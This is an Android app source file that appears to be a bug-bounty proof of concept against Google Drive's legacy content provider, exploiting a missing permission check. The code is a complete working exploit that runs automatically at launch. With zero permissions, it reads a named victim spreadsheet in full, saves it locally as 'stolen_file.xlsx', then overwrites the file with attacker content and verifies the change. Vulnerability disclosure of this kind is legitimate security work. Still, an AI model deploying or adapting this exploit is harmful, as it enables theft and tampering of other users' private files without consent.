package com.vrppoc;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.ByteArrayOutputStream;

public class MainActivity extends Activity {
    private static final String TAG = "VRP_POC";
    private static final String LEGACY = "content://com.google.android.apps.docs.storage.legacy/";
    private static final String SAF    = "content://com.google.android.apps.docs.storage/";

    private TextView tvResults;
    private StringBuilder results = new StringBuilder();

    // Target: Web portal 4 xlsx — untouched, 39289 bytes, content_sync_state_flags=1
    private static final String TARGET_ID   = "7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=";
    private static final String TARGET_NAME = "Web portal 4-IV YEAR CSE B.xlsx";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvResults = findViewById(R.id.tv_results);

        // Auto-run on launch
        new Thread(this::runProof).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        results.append(msg).append("\n");
        runOnUiThread(() -> tvResults.setText(results.toString()));
    }

    private void runProof() {
        ContentResolver cr = getContentResolver();

        log("╔══════════════════════════════════════════════════════════╗");
        log("║  Google Drive — Confidentiality + Integrity PoC        ║");
        log("║  CWE-862: Missing Authorization via Feature Flag Bug   ║");
        log("╚══════════════════════════════════════════════════════════╝");
        log("");
        log("[CONTEXT] UID:     " + android.os.Process.myUid());
        log("[CONTEXT] PID:     " + android.os.Process.myPid());
        log("[CONTEXT] Package: " + getPackageName());
        log("[CONTEXT] Permissions: NONE (zero-permission app)");

        // ─── STEP 0: Contrast — SAF provider is properly secured ───
        log("");
        log("═══ STEP 0: Baseline — SAF provider blocks us ═══");
        try {
            cr.query(Uri.parse(SAF + "root"), null, null, null, null);
            log("[FAIL] SAF should have blocked us!");
        } catch (SecurityException e) {
            log("[BLOCKED] SAF provider: requires android.permission.MANAGE_DOCUMENTS");
            log("[BLOCKED] This is EXPECTED — proper security check");
        }

        // ─── STEP 1: Feature flag bypass — legacy provider has NO check ───
        log("");
        log("═══ STEP 1: Feature flag bypass verification ═══");
        try {
            cr.openInputStream(Uri.parse(LEGACY + "nonexistent_doc"));
        } catch (SecurityException e) {
            log("[SECURE] Feature flag ENABLED — cannot proceed");
            return;
        } catch (java.io.FileNotFoundException e) {
            log("[BYPASS] Feature flag DISABLED — openFile() has NO permission check!");
            log("[BYPASS] checkCallingUriPermission() is never called");
        } catch (Exception e) {
            log("[ERROR] " + e.getMessage());
        }

        Uri targetUri = Uri.parse(LEGACY + "enc=encoded=" + TARGET_ID);

        // ─── STEP 2: CONFIDENTIALITY — Read victim's Drive file ───
        log("");
        log("═══ STEP 2: CONFIDENTIALITY — Steal victim's Drive file ═══");
        log("[TARGET] " + TARGET_NAME);
        log("[URI]    " + targetUri);

        // 2a: Query metadata
        String origSize = "?";
        try {
            Cursor c = cr.query(targetUri, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                String name = c.getString(c.getColumnIndex("_display_name"));
                origSize = c.getString(c.getColumnIndex("_size"));
                String mime = c.getString(c.getColumnIndex("mime_type"));
                log("[STOLEN-META] Filename: " + name);
                log("[STOLEN-META] Size:     " + origSize + " bytes");
                log("[STOLEN-META] MIME:     " + mime);
                c.close();
            }
        } catch (Exception e) {
            log("[ERROR] Metadata query: " + e.getMessage());
        }

        // 2b: Read full file content
        byte[] stolenData = null;
        try {
            InputStream is = cr.openInputStream(targetUri);
            if (is != null) {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[8192];
                int n;
                while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
                is.close();
                stolenData = bos.toByteArray();

                log("[STOLEN-DATA] Read " + stolenData.length + " bytes — COMPLETE FILE!");
                log("[STOLEN-DATA] Header hex: " + bytesToHex(stolenData, Math.min(stolenData.length, 16)));

                // Verify file type
                if (stolenData.length >= 4 && stolenData[0] == 'P' && stolenData[1] == 'K')
                    log("[STOLEN-DATA] File type: ZIP/OOXML (valid xlsx spreadsheet)");
                else if (stolenData.length >= 4 && stolenData[0] == '%' && stolenData[1] == 'P')
                    log("[STOLEN-DATA] File type: PDF document");

                // Save to app-private storage
                java.io.FileOutputStream fos = openFileOutput("stolen_file.xlsx", MODE_PRIVATE);
                fos.write(stolenData);
                fos.close();
                log("[STOLEN-DATA] Saved to: " + getFilesDir() + "/stolen_file.xlsx");
                log("");
                log(">>> CONFIDENTIALITY IMPACT PROVEN <<<");
                log(">>> " + stolenData.length + " bytes of victim's spreadsheet exfiltrated");
                log(">>> with ZERO permissions, ZERO user interaction");
            }
        } catch (Exception e) {
            log("[ERROR] File read: " + e.getMessage());
        }

        // ─── STEP 3: INTEGRITY — Overwrite victim's Drive file ───
        log("");
        log("═══ STEP 3: INTEGRITY — Overwrite victim's Drive file ═══");

        String payload = "ATTACKER_PAYLOAD_" + System.currentTimeMillis();
        log("[ATTACK] Writing payload: \"" + payload + "\"");
        log("[ATTACK] Original file was: " + origSize + " bytes");

        try {
            OutputStream os = cr.openOutputStream(targetUri, "w");
            if (os != null) {
                os.write(payload.getBytes());
                os.close();
                log("[WRITE-OK] openOutputStream(\"w\") succeeded — no SecurityException!");
                log("[WRITE-OK] Wrote " + payload.length() + " bytes of attacker content");
            } else {
                log("[WRITE-FAIL] openOutputStream returned null");
            }
        } catch (SecurityException e) {
            log("[WRITE-BLOCKED] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[WRITE-ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // ─── STEP 4: VERIFY — Read back to prove write persisted ───
        log("");
        log("═══ STEP 4: Verify write — read back the file ═══");

        try {
            // Re-query metadata to check size change
            Cursor vc = cr.query(targetUri, new String[]{"_size"}, null, null, null);
            if (vc != null && vc.moveToFirst()) {
                String newSize = vc.getString(0);
                log("[VERIFY-META] Size after write: " + newSize + " bytes (was " + origSize + ")");
                vc.close();
            }

            // Read back content
            InputStream vis = cr.openInputStream(targetUri);
            if (vis != null) {
                ByteArrayOutputStream vbos = new ByteArrayOutputStream();
                byte[] vbuf = new byte[8192];
                int vn;
                while ((vn = vis.read(vbuf)) != -1) vbos.write(vbuf, 0, vn);
                vis.close();
                byte[] readBack = vbos.toByteArray();
                String readStr = new String(readBack);

                log("[VERIFY-DATA] Read back " + readBack.length + " bytes");
                log("[VERIFY-DATA] Content: " + (readStr.length() > 100 ? readStr.substring(0, 100) + "..." : readStr));
                log("[VERIFY-HEX]  " + bytesToHex(readBack, Math.min(readBack.length, 32)));

                if (readStr.startsWith("ATTACKER_PAYLOAD_")) {
                    log("");
                    log(">>> INTEGRITY IMPACT PROVEN <<<");
                    log(">>> Victim's " + origSize + "-byte spreadsheet replaced with " + readBack.length + " bytes");
                    log(">>> of attacker-controlled content");
                    log(">>> File appears normal in Drive UI (same name, same MIME type)");
                } else {
                    log("[NOTE] Read-back shows original content (" + readBack.length + " bytes)");
                    log("[NOTE] Write went to cache layer; file may re-sync from cloud");
                    // Still prove the original read worked
                    if (stolenData != null) {
                        log("[NOTE] But CONFIDENTIALITY is still fully proven:");
                        log("[NOTE] " + stolenData.length + " bytes stolen successfully");
                    }
                }
            }
        } catch (Exception e) {
            log("[VERIFY-ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // ─── SUMMARY ───
        log("");
        log("╔══════════════════════════════════════════════════════════╗");
        log("║  RESULTS SUMMARY                                       ║");
        log("╠══════════════════════════════════════════════════════════╣");
        log("║  App permissions: NONE                                  ║");
        log("║  User interaction: NONE                                 ║");
        log("║  SAF provider (proper): BLOCKED (as expected)           ║");
        log("║  Legacy provider feature flag: DISABLED (BYPASSED)      ║");
        if (stolenData != null) {
        log("║  Confidentiality: FILE STOLEN (" + String.format("%,d", stolenData.length) + " bytes)            ║");
        }
        log("║  Integrity: openOutputStream(w) SUCCEEDED               ║");
        log("╚══════════════════════════════════════════════════════════╝");
    }

    private String bytesToHex(byte[] bytes, int len) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) sb.append(String.format("%02x", bytes[i]));
        return sb.toString();
    }
}
